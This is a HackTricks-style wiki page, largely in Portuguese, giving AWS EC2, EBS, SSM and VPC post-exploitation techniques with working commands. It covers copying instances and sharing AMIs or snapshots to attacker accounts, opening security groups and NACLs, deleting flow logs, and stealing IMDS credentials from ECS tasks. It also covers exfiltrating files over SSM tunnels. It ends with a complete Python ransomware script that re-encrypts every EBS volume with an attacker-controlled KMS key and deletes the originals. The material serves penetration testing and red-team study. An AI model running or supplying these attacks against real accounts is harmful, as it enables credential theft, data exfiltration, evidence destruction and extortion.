# AWS - EC2, EBS, SSM & VPC Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## EC2 & VPC

Para mais informações consulte:

{{#ref}}
../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/
{{#endref}}

### **Malicious VPC Mirror -** `ec2:DescribeInstances`, `ec2:RunInstances`, `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress`, `ec2:CreateTrafficMirrorTarget`, `ec2:CreateTrafficMirrorSession`, `ec2:CreateTrafficMirrorFilter`, `ec2:CreateTrafficMirrorFilterRule`

VPC traffic mirroring **duplicates inbound and outbound traffic for EC2 instances within a VPC** sem a necessidade de instalar nada nas próprias instâncias. Esse tráfego duplicado normalmente seria enviado para algo como um network intrusion detection system (IDS) para análise e monitoramento.  
Um atacante poderia abusar disso para capturar todo o tráfego e obter informações sensíveis a partir dele:

Para mais informações veja esta página:

{{#ref}}
aws-malicious-vpc-mirror.md
{{#endref}}

### Copy Running Instance

Instâncias geralmente contêm algum tipo de informação sensível. Existem diferentes maneiras de acessá-las (check [EC2 privilege escalation tricks](../../aws-privilege-escalation/aws-ec2-privesc/README.md)). No entanto, outra maneira de verificar o que elas contêm é **criar um AMI e executar uma nova instância (mesmo na sua própria conta) a partir dele**:
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### EBS Snapshot dump

**Snapshots são backups de volumes**, que geralmente conterão **informações sensíveis**, portanto verificá-los deve revelar essas informações.\
Se encontrar um **volume sem snapshot** você poderia: **Criar um snapshot** e executar as seguintes ações ou simplesmente **montá-lo em uma instância** dentro da conta:

{{#ref}}
aws-ebs-snapshot-dump.md
{{#endref}}

### Covert Disk Exfiltration via AMI Store-to-S3

Exporte uma EC2 AMI diretamente para o S3 usando `CreateStoreImageTask` para obter uma imagem de disco raw sem compartilhamento de snapshot. Isso permite forense offline completa ou roubo de dados enquanto mantém a rede da instância inalterada.

{{#ref}}
aws-ami-store-s3-exfiltration.md
{{#endref}}

### Live Data Theft via EBS Multi-Attach

Anexe um volume io1/io2 Multi-Attach a uma segunda instância e monte-o em modo somente leitura para extrair dados ao vivo sem snapshots. Útil quando o volume da vítima já tem Multi-Attach habilitado na mesma AZ.

{{#ref}}
aws-ebs-multi-attach-data-theft.md
{{#endref}}

### EC2 Instance Connect Endpoint Backdoor

Crie um EC2 Instance Connect Endpoint, autorize ingress e injete chaves SSH efêmeras para acessar instâncias privadas através de um túnel gerenciado. Concede caminhos rápidos de movimento lateral sem abrir portas públicas.

{{#ref}}
aws-ec2-instance-connect-endpoint-backdoor.md
{{#endref}}

### EC2 ENI Secondary Private IP Hijack

Mova o IP privado secundário de uma ENI vítima para uma ENI controlada pelo atacante para se passar por hosts confiáveis que estão allowlisted por IP. Permite contornar ACLs internas ou regras de SG vinculadas a endereços específicos.

{{#ref}}
aws-eni-secondary-ip-hijack.md
{{#endref}}

### Elastic IP Hijack for Ingress/Egress Impersonation

Reassocie um Elastic IP da instância vítima para o atacante para interceptar tráfego de entrada ou originar conexões de saída que parecem vir de IPs públicos confiáveis.

{{#ref}}
aws-eip-hijack-impersonation.md
{{#endref}}

### Security Group Backdoor via Managed Prefix Lists

Se uma regra de security group referencia uma customer-managed prefix list, adicionar CIDRs do atacante à lista expande silenciosamente o acesso por todas as regras de SG dependentes sem modificar o SG em si.

{{#ref}}
aws-managed-prefix-list-backdoor.md
{{#endref}}

### VPC Endpoint Egress Bypass

Crie gateway ou interface VPC endpoints para recuperar acesso de saída de subnets isoladas. Aproveitar private links gerenciados pela AWS contorna controles IGW/NAT ausentes para exfiltração de dados.

{{#ref}}
aws-vpc-endpoint-egress-bypass.md
{{#endref}}

### `ec2:AuthorizeSecurityGroupIngress`

Um atacante com a permissão ec2:AuthorizeSecurityGroupIngress pode adicionar regras de entrada a security groups (por exemplo, permitindo tcp:80 de 0.0.0.0/0), expondo assim serviços internos para a Internet pública ou para redes não autorizadas.
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
```
# `ec2:ReplaceNetworkAclEntry`
Um atacante com permissões ec2:ReplaceNetworkAclEntry (ou similares) pode modificar os Network ACLs (NACLs) de um subnet para torná‑los muito permissivos — por exemplo permitindo 0.0.0.0/0 em portas críticas — expondo todo o intervalo do subnet para a Internet ou para segmentos de rede não autorizados. Ao contrário dos Security Groups, que são aplicados por instância, os NACLs são aplicados no nível do subnet, então alterar um NACL restritivo pode ter um raio de impacto muito maior, permitindo o acesso a muito mais hosts.
```bash
aws ec2 replace-network-acl-entry \
--network-acl-id <ACL_ID> \
--rule-number 100 \
--protocol <PROTOCOL> \
--rule-action allow \
--egress <true|false> \
--cidr-block 0.0.0.0/0
```
### `ec2:Delete*`

Um atacante com permissões ec2:Delete* e iam:Remove* pode deletar recursos e configurações de infraestrutura críticas — por exemplo key pairs, launch templates/versions, AMIs/snapshots, volumes ou attachments, security groups ou regras, ENIs/network endpoints, route tables, gateways, ou managed endpoints. Isso pode causar interrupção imediata do serviço, perda de dados e perda de evidências forenses.

One example is deleting a security group:

aws ec2 delete-security-group \
--group-id <SECURITY_GROUP_ID>

### VPC Flow Logs Cross-Account Exfiltration

Aponte VPC Flow Logs para um bucket S3 controlado pelo atacante para coletar continuamente metadados de rede (source/destination, ports) fora da conta da vítima para reconhecimento de longo prazo.

{{#ref}}
aws-vpc-flow-logs-cross-account-exfiltration.md
{{#endref}}

### Data Exfiltration

#### DNS Exfiltration

Mesmo que você bloqueie um EC2 para que nenhum tráfego possa sair, ele ainda pode **exfil via DNS**.

- **VPC Flow Logs não registrarão isso**.
- Você não tem acesso aos DNS logs da AWS.
- Desative isso definindo "enableDnsSupport" como false com:

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### Exfiltration via API calls

Um atacante poderia chamar endpoints de API de uma conta controlada por ele. Cloudtrail registrará essas chamadas e o atacante poderá ver os dados exfiltrados nos logs do Cloudtrail.

### Open Security Group

Você pode obter acesso adicional a serviços de rede abrindo portas assim:
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
### Privesc to ECS

É possível executar uma instância EC2 e registrá-la para ser usada para executar instâncias ECS e então roubar os dados das instâncias ECS.

For [**more information check this**](../../aws-privilege-escalation/aws-ec2-privesc/README.md#privesc-to-ecs).

### ECS-on-EC2 IMDS Abuse & ECS Agent Impersonation

Um comprometimento dentro de qualquer ECS task rodando em uma EC2 container instance normalmente é suficiente para pivotar para o papel do host e para os IAM roles associados a todas as outras tasks naquele node. Como não há isolamento de tarefas para ECS-on-EC2, toda task pode consultar o EC2 Instance Metadata Service (IMDS) por padrão, roubar o container instance profile e então falar o mesmo protocolo WebSocket que o ECS agent usa com o control plane (a primitiva **ECScape**) para requisitar as credenciais de cada task atualmente agendada nesse host. A Latacora documentou esse fluxo na pesquisa ECS-on-EC2 IMDS deles, que o resumo ofensivo a seguir condensa.

#### Attack chain

1. **Steal the instance profile from inside the container.** Assume IMDSv2 is required, so request a token and then fetch the profile.

```bash
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/{InstanceProfileName}
```
2. **Use the container instance role to impersonate the ECS agent.** Com essas credenciais você pode falar no canal WebSocket não documentado que o ECS agent usa; o control plane confia em você como se fosse o agente real e entrega **todas as credenciais IAM das tasks** para o seu processo. Você agora pode executar tasks com privilégios mais altos localmente, dumpar secrets do ambiente das tasks, ou atualizar services/tasks para redeploy workloads que você possa inspecionar completamente.

#### IMDS reachability with IMDSv2 + hop limit 1

Configurar IMDSv2 com `HttpTokens=required` e `HttpPutResponseHopLimit=1` só bloqueia tasks que vivem atrás de um hop extra (Docker bridge). Outros modos de rede permanecem dentro de um hop do Nitro controller e ainda recebem respostas:

| ECS network mode | IMDS reachable? | Reason |
| --- | --- | --- |
| `awsvpc` | ✅ | Cada task recebe sua própria ENI que ainda está a um hop do IMDS, então tokens e respostas de metadata chegam com sucesso. |
| `host` | ✅ | As tasks compartilham o namespace do host, portanto veem a mesma distância de hop que a instância EC2. |
| `bridge` | ❌ | As respostas morrem na Docker bridge porque esse hop extra esgota o limite de hops. |

Portanto, **nunca presuma que hop limit 1 protege workloads em awsvpc ou host-mode** — sempre teste de dentro dos seus containers.

#### Detecting IMDS blocks per network mode

- **awsvpc tasks:** Security groups, NACLs, ou ajustes de roteamento não podem bloquear o endereço link-local 169.254.169.254 porque o Nitro injeta ele no host. Verifique `/etc/ecs/ecs.config` por `ECS_AWSVPC_BLOCK_IMDS=true`. Se a flag estiver ausente (padrão) você pode curl IMDS diretamente da task. Se estiver setada, pivoteie para o namespace do host/agent para reverter ou execute suas ferramentas fora do awsvpc.

- **bridge mode:** Quando requisições de metadata falham mesmo com hop limit 1 configurado, os defensores provavelmente inseriram uma regra DROP em `DOCKER-USER` como `--in-interface docker+ --destination 169.254.169.254/32 --jump DROP`. Listar `iptables -S DOCKER-USER` expõe isso, e acesso root permite deletar ou reordenar a regra antes de consultar o IMDS.

- **host mode:** Inspecione a configuração do agent por `ECS_ENABLE_TASK_IAM_ROLE_NETWORK_HOST=false`. Essa configuração remove os IAM roles das tasks inteiramente, então você deve ou reabilitá-la, mover para tasks awsvpc, ou roubar credenciais através de outro processo no host. Quando o valor é `true` (padrão), todo processo em host-mode — incluindo containers comprometidos — pode acessar o IMDS a menos que filtros bespoke de eBPF/cgroup bloqueiem `169.254.169.254`; procure por programas tc/eBPF ou regras iptables referenciando esse endereço.

A Latacora até lançou código de validação Terraform (https://github.com/latacora/ecs-on-ec2-gaps-in-imds-hardening) que você pode rodar em uma conta alvo para enumerar quais modos de rede ainda expõem metadata e planejar seu próximo salto em conformidade.

Uma vez que você entenda quais modos expõem o IMDS, pode planejar sua rota pós-exploração: mire em qualquer ECS task, solicite o instance profile, transforme-se no agent, e colha o role de todas as outras tasks para movimento lateral ou persistência dentro do cluster.

### Remove VPC flow logs
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### SSM Port Forwarding

Permissões necessárias:

- `ssm:StartSession`

Além da execução de comandos, o SSM permite tunelamento de tráfego, que pode ser abusado para pivotar a partir de instâncias EC2 que não têm acesso de rede devido a Security Groups ou NACLs.
Um dos cenários em que isso é útil é pivotar de um [Bastion Host](https://www.geeksforgeeks.org/what-is-aws-bastion-host/) para um cluster EKS privado.

> Para iniciar uma sessão, é necessário ter o SessionManagerPlugin instalado: https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html

1. Instale o SessionManagerPlugin na sua máquina
2. Faça login no Bastion EC2 usando o seguinte comando:
```shell
aws ssm start-session --target "$INSTANCE_ID"
```
3. Obtenha as credenciais temporárias AWS do Bastion EC2 com o script [Abusing SSRF in AWS EC2 environment](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html#abusing-ssrf-in-aws-ec2-environment)
4. Transfira as credenciais para sua própria máquina no arquivo `$HOME/.aws/credentials` como o perfil `[bastion-ec2]`
5. Faça login no EKS como o Bastion EC2:
```shell
aws eks update-kubeconfig --profile bastion-ec2 --region <EKS-CLUSTER-REGION> --name <EKS-CLUSTER-NAME>
```
6. Atualize o campo `server` no arquivo `$HOME/.kube/config` para apontar para `https://localhost`
7. Crie um túnel SSM da seguinte forma:
```shell
sudo aws ssm start-session --target $INSTANCE_ID --document-name AWS-StartPortForwardingSessionToRemoteHost --parameters '{"host":["<TARGET-IP-OR-DOMAIN>"],"portNumber":["443"], "localPortNumber":["443"]}' --region <BASTION-INSTANCE-REGION>
```
8. O tráfego da ferramenta `kubectl` agora é encaminhado através do túnel SSM via Bastion EC2 e você pode acessar o cluster EKS privado a partir da sua própria máquina executando:
```shell
kubectl get pods --insecure-skip-tls-verify
```
Note que as conexões SSL falharão a menos que você defina a flag `--insecure-skip-tls-verify ` (ou seu equivalente em ferramentas de auditoria K8s). Visto que o tráfego é tunelado através do túnel seguro AWS SSM, você está protegido contra qualquer tipo de ataque MitM.

Por fim, esta técnica não é específica para atacar clusters EKS privados. Você pode definir domínios e portas arbitrárias para redirecionar (pivot) para qualquer outro serviço AWS ou uma aplicação personalizada.

---

#### Encaminhamento Rápido Local ↔️ Remoto Port Forward (AWS-StartPortForwardingSession)

Se você só precisa encaminhar **uma porta TCP do EC2 para sua máquina local** você pode usar o documento SSM `AWS-StartPortForwardingSession` (nenhum parâmetro de host remoto é necessário):
```bash
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8000","localPortNumber"="8000" \
--region <REGION>
```
O comando estabelece um túnel bidirecional entre sua workstation (`localPortNumber`) e a porta selecionada (`portNumber`) na instance **without opening any inbound Security-Group rules**.

Common use cases:

* **File exfiltration**
1. Na instance, inicie um servidor HTTP rápido que aponte para o diretório que você quer exfiltrate:

```bash
python3 -m http.server 8000
```

2. Da sua workstation, recupere os arquivos através do SSM tunnel:

```bash
curl http://localhost:8000/loot.txt -o loot.txt
```

* **Acessando aplicações web internas (por exemplo Nessus)**
```bash
# Forward remote Nessus port 8834 to local 8835
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8834","localPortNumber"="8835"
# Browse to http://localhost:8835
```
Dica: Compress and encrypt evidence antes de exfiltrating it para que o CloudTrail não registre o conteúdo em clear-text:
```bash
# On the instance
7z a evidence.7z /path/to/files/* -p'Str0ngPass!'
```
### Compartilhar AMI
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### Pesquisar informações sensíveis em AMIs públicas e privadas

- [https://github.com/saw-your-packet/CloudShovel](https://github.com/saw-your-packet/CloudShovel): CloudShovel é uma ferramenta projetada para **buscar informações sensíveis em Amazon Machine Images (AMIs) públicas ou privadas**. Ela automatiza o processo de iniciar instâncias a partir das AMIs-alvo, montar seus volumes e escanear em busca de possíveis segredos ou dados sensíveis.

### Compartilhar EBS Snapshot
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### EBS Ransomware PoC

Uma prova de conceito semelhante à demonstração de Ransomware mostrada nas notas de post-exploitation do S3. O KMS deveria ser renomeado para RMS (Ransomware Management Service) dada a facilidade de usá-lo para criptografar vários serviços da AWS.

Primeiro, a partir de uma conta AWS de 'attacker', crie uma chave gerenciada pelo cliente no KMS. Para este exemplo vamos deixar a AWS gerenciar os dados da chave para mim, mas em um cenário realista um ator malicioso reteria os dados da chave fora do controle da AWS. Altere a key policy para permitir que qualquer Principal de conta AWS use a chave. Nesta key policy, o nome da conta era 'AttackSim' e a regra da policy que permite todo o acesso é chamada 'Outside Encryption'
```
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Outside Encryption",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey",
"kms:GenerateDataKeyWithoutPlainText",
"kms:CreateGrant"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
The key policy rule needs the following enabled to allow for the ability to use it to encrypt an EBS volume:

- `kms:CreateGrant`
- `kms:Decrypt`
- `kms:DescribeKey`
- `kms:GenerateDataKeyWithoutPlainText`
- `kms:ReEncrypt`

Now with the publicly accessible key to use. We can use a 'victim' account that has some EC2 instances spun up with unencrypted EBS volumes attached. This 'victim' account's EBS volumes are what we're targeting for encryption, this attack is under the assumed breach of a high-privilege AWS account.

![Pasted image 20231231172655](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/5b9a96cd-6006-4965-84a4-b090456f90c6) ![Pasted image 20231231172734](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4294289c-0dbd-4eb6-a484-60b4e4266459)

Semelhante ao exemplo de ransomware em S3. Este ataque criará cópias dos volumes EBS anexados usando snapshots, usará a key publicamente disponível da conta 'attacker' para criptografar os novos volumes EBS, então desanexará os volumes EBS originais das instâncias EC2 e os excluirá, e então por fim excluirá os snapshots usados para criar os novos volumes EBS criptografados. ![Pasted image 20231231173130](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/34808990-2b3b-4975-a523-8ee45874279e)

Isso resulta em apenas volumes EBS criptografados disponíveis na conta.

![Pasted image 20231231173338](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/eccdda58-f4b1-44ea-9719-43afef9a8220)

Também vale notar que o script parou as instâncias EC2 para desanexar e deletar os volumes EBS originais. Os volumes originais não criptografados foram removidos.

![Pasted image 20231231173931](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/cc31a5c9-fbb4-4804-ac87-911191bb230e)

Next, return to the key policy in the 'attacker' account and remove the 'Outside Encryption' policy rule from the key policy.
```json
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": ["kms:CreateGrant", "kms:ListGrants", "kms:RevokeGrant"],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Aguarde um momento para que a nova key policy se propague. Em seguida, volte para a conta 'victim' e tente anexar um dos volumes EBS recém-criptografados. Você verá que consegue anexar o volume.

![Pasted image 20231231174131](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47) ![Pasted image 20231231174258](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4)

Mas quando você tentar realmente iniciar a instância EC2 com o volume EBS criptografado, isso falhará e a instância passará do estado 'pending' de volta para o estado 'stopped' para sempre, já que o volume EBS anexado não pode ser descriptografado usando a key porque a key policy não permite mais.

![Pasted image 20231231174322](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514) ![Pasted image 20231231174352](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0)

Este é o python script usado. Ele recebe AWS creds para uma conta 'victim' e um valor ARN público do AWS para a key que será usada para a criptografia. O script fará cópias criptografadas de TODOS os volumes EBS disponíveis anexados a TODAS as instâncias EC2 na conta AWS alvo, então parará cada instância EC2, desanexará os volumes EBS originais, os excluirá e, por fim, excluirá todos os snapshots utilizados durante o processo. Isso deixará apenas volumes EBS criptografados na conta 'victim' alvo. USE ESTE SCRIPT SOMENTE EM UM AMBIENTE DE TESTE, ELE É DESTRUTIVO E IRÁ EXCLUIR TODOS OS VOLUMES EBS ORIGINAIS. Você pode recuperá-los usando a KMS key utilizada e restaurá-los ao estado original via snapshots, mas queria apenas avisar que, no fim das contas, isto é um ransomware PoC.
```
import boto3
import argparse
from botocore.exceptions import ClientError

def enumerate_ec2_instances(ec2_client):
instances = ec2_client.describe_instances()
instance_volumes = {}
for reservation in instances['Reservations']:
for instance in reservation['Instances']:
instance_id = instance['InstanceId']
volumes = [vol['Ebs']['VolumeId'] for vol in instance['BlockDeviceMappings'] if 'Ebs' in vol]
instance_volumes[instance_id] = volumes
return instance_volumes

def snapshot_volumes(ec2_client, volumes):
snapshot_ids = []
for volume_id in volumes:
snapshot = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_ids.append(snapshot['SnapshotId'])
return snapshot_ids

def wait_for_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])

def create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn):
new_volume_ids = []
for snapshot_id in snapshot_ids:
snapshot_info = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
volume_id = snapshot_info['VolumeId']
volume_info = ec2_client.describe_volumes(VolumeIds=[volume_id])['Volumes'][0]
availability_zone = volume_info['AvailabilityZone']

volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone,
Encrypted=True, KmsKeyId=kms_key_arn)
new_volume_ids.append(volume['VolumeId'])
return new_volume_ids

def stop_instances(ec2_client, instance_ids):
for instance_id in instance_ids:
try:
instance_description = ec2_client.describe_instances(InstanceIds=[instance_id])
instance_state = instance_description['Reservations'][0]['Instances'][0]['State']['Name']

if instance_state == 'running':
ec2_client.stop_instances(InstanceIds=[instance_id])
print(f"Stopping instance: {instance_id}")
ec2_client.get_waiter('instance_stopped').wait(InstanceIds=[instance_id])
print(f"Instance {instance_id} stopped.")
else:
print(f"Instance {instance_id} is not in a state that allows it to be stopped (current state: {instance_state}).")

except ClientError as e:
print(f"Error stopping instance {instance_id}: {e}")

def detach_and_delete_volumes(ec2_client, volumes):
for volume_id in volumes:
try:
ec2_client.detach_volume(VolumeId=volume_id)
ec2_client.get_waiter('volume_available').wait(VolumeIds=[volume_id])
ec2_client.delete_volume(VolumeId=volume_id)
print(f"Deleted volume: {volume_id}")
except ClientError as e:
print(f"Error detaching or deleting volume {volume_id}: {e}")


def delete_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
try:
ec2_client.delete_snapshot(SnapshotId=snapshot_id)
print(f"Deleted snapshot: {snapshot_id}")
except ClientError as e:
print(f"Error deleting snapshot {snapshot_id}: {e}")

def replace_volumes(ec2_client, instance_volumes):
instance_ids = list(instance_volumes.keys())
stop_instances(ec2_client, instance_ids)

all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
detach_and_delete_volumes(ec2_client, all_volumes)

def ebs_lock(access_key, secret_key, region, kms_key_arn):
ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn)  # New encrypted volumes are created but not attached
replace_volumes(ec2_client, instance_volumes)  # Stops instances, detaches and deletes old volumes
delete_snapshots(ec2_client, snapshot_ids)  # Optionally delete snapshots if no longer needed

def parse_arguments():
parser = argparse.ArgumentParser(description='EBS Volume Encryption and Replacement Tool')
parser.add_argument('--access-key', required=True, help='AWS Access Key ID')
parser.add_argument('--secret-key', required=True, help='AWS Secret Access Key')
parser.add_argument('--region', required=True, help='AWS Region')
parser.add_argument('--kms-key-arn', required=True, help='KMS Key ARN for EBS volume encryption')
return parser.parse_args()

def main():
args = parse_arguments()
ec2_client = boto3.client('ec2', aws_access_key_id=args.access_key, aws_secret_access_key=args.secret_key, region_name=args.region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, args.kms_key_arn)
replace_volumes(ec2_client, instance_volumes)
delete_snapshots(ec2_client, snapshot_ids)

if __name__ == "__main__":
main()
```
## Referências

- [Latacora - ECS on EC2: Cobrindo lacunas no hardening do IMDS](https://www.latacora.com/blog/2025/10/02/ecs-on-ec2-covering-gaps-in-imds-hardening/)
- [Latacora ecs-on-ec2-gaps-in-imds-hardening Terraform repo](https://github.com/latacora/ecs-on-ec2-gaps-in-imds-hardening)
- [Pentest Partners – Como transferir arquivos na AWS usando SSM](https://www.pentestpartners.com/security-blog/how-to-transfer-files-in-aws-using-ssm/)

{{#include ../../../../banners/hacktricks-training.md}}
